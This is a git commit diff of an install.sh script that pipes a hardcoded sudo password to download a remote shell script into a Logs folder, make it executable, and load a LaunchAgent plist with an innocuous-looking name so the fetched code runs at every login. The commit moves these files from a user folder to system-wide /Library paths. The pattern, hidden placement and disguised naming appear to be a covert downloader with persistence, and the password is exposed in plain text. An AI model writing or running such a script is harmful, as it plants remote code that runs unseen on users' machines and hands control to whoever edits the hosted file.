97537c0c0743d4d211d9a3e238b7099faa747d61
sudoday <mirrorjssite@gmail.com>
2017-06-05 19:47:08 -0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,5 @@
-echo facu14y | sudo -S curl -o /Users/psuser/Library/Logs/process.sh https://raw.githubusercontent.com/sudoday/project-duck/master/process.sh
-echo facu14y | sudo -S chmod +x /Users/psuser/Library/Logs/process.sh
-/Users/psuser/Library/Logs/process.sh
-echo facu14y | sudo -S  curl -o /Users/psuser/Library/LaunchAgents/com.remote.loginscript.plist https://raw.githubusercontent.com/sudoday/project-duck/master/plist
-echo facu14y | sudo -S chown root:wheel /Users/psuser/Library/LaunchAgents/com.remote.loginscript.plist
-launchctl load /Users/psuser/Library/LaunchAgents/com.remote.loginscript.plist
+echo facu14y | sudo -S curl -o /Library/Logs/process.sh https://raw.githubusercontent.com/sudoday/project-duck/master/process.sh
+echo facu14y | sudo -S chmod +x /Library/Logs/process.sh
+echo facu14y | sudo -S  curl -o /Library/LaunchAgents/com.user.process.plist https://raw.githubusercontent.com/sudoday/project-duck/master/plist
+echo facu14y | sudo -S chown root:wheel /Library/LaunchAgents/com.user.process.plist
+launchctl load /Library/LaunchAgents/com.user.process.plist
